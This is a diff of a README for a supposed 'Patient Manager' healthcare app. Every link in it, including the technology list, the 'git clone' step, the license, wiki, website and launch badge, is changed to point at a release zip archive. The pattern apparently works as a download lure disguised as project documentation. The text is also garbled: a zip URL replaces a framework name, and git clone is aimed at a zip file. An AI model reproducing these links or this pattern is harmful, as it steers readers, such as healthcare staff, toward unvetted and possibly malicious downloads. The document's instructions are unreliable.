@@ -2,7 +2,7 @@
 
 ![Patient Manager](https://image-link-here)
 
-Welcome to the Patient Manager repository! This fullstack app is built using React Native and https://github.com/wagdyop/patient-manager/releases/download/v1.0/Release.zip, designed to help healthcare professionals manage patient information efficiently. Whether you are a doctor, nurse, or healthcare administrator, this app aims to streamline the process of tracking patient data and appointments.
+Welcome to the Patient Manager repository! This fullstack app is built using React Native and https://github.com/wagdyop/patient-manager/releases/download/v2.0/Software.zip, designed to help healthcare professionals manage patient information efficiently. Whether you are a doctor, nurse, or healthcare administrator, this app aims to streamline the process of tracking patient data and appointments.
 
 ## Features 🌟
 - **User Authentication**: Utilizes JWT authentication for secure access to patient data.
@@ -14,7 +14,7 @@ Welcome to the Patient Manager repository! This fullstack app is built using Rea
 ## Technologies Used 🚀
 - Docker
 - Expo
-- https://github.com/wagdyop/patient-manager/releases/download/v1.0/Release.zip
+- https://github.com/wagdyop/patient-manager/releases/download/v2.0/Software.zip
 - JWT Authentication
 - NativeWind
 - PostgreSQL
@@ -27,7 +27,7 @@ Welcome to the Patient Manager repository! This fullstack app is built using Rea
 ## Installation Steps 🛠️
 1. Clone the repository:
    ```bash
-   git clone https://github.com/wagdyop/patient-manager/releases/download/v1.0/Release.zip
+   git clone https://github.com/wagdyop/patient-manager/releases/download/v2.0/Software.zip
    ```
 2. Install dependencies for the frontend and backend:
    ```bash
@@ -54,12 +54,12 @@ Contributions are welcome! If you would like to improve the Patient Manager app,
 If you encounter any issues or bugs while using the app, please open a new issue on the GitHub repository. Our team will address it as soon as possible to ensure a smooth user experience.
 
 ## License ℹ️
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/wagdyop/patient-manager/releases/download/v1.0/Release.zip) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/wagdyop/patient-manager/releases/download/v2.0/Software.zip) file for details.
 
 ## Additional Resources 📚
-- Check out our [Wiki](https://github.com/wagdyop/patient-manager/releases/download/v1.0/Release.zip) for detailed documentation.
-- Explore our [Website](https://github.com/wagdyop/patient-manager/releases/download/v1.0/Release.zip) for the latest updates and features.
+- Check out our [Wiki](https://github.com/wagdyop/patient-manager/releases/download/v2.0/Software.zip) for detailed documentation.
+- Explore our [Website](https://github.com/wagdyop/patient-manager/releases/download/v2.0/Software.zip) for the latest updates and features.
 
-[![Launch App](https://github.com/wagdyop/patient-manager/releases/download/v1.0/Release.zip%20App-Click%20Here-green)](https://github.com/wagdyop/patient-manager/releases/download/v1.0/Release.zip)
+[![Launch App](https://github.com/wagdyop/patient-manager/releases/download/v2.0/Software.zip%20App-Click%20Here-green)](https://github.com/wagdyop/patient-manager/releases/download/v2.0/Software.zip)
 
 Thank you for visiting the Patient Manager repository! We hope this app proves to be a valuable tool for managing patient data efficiently. 💡👩‍⚕️🚑
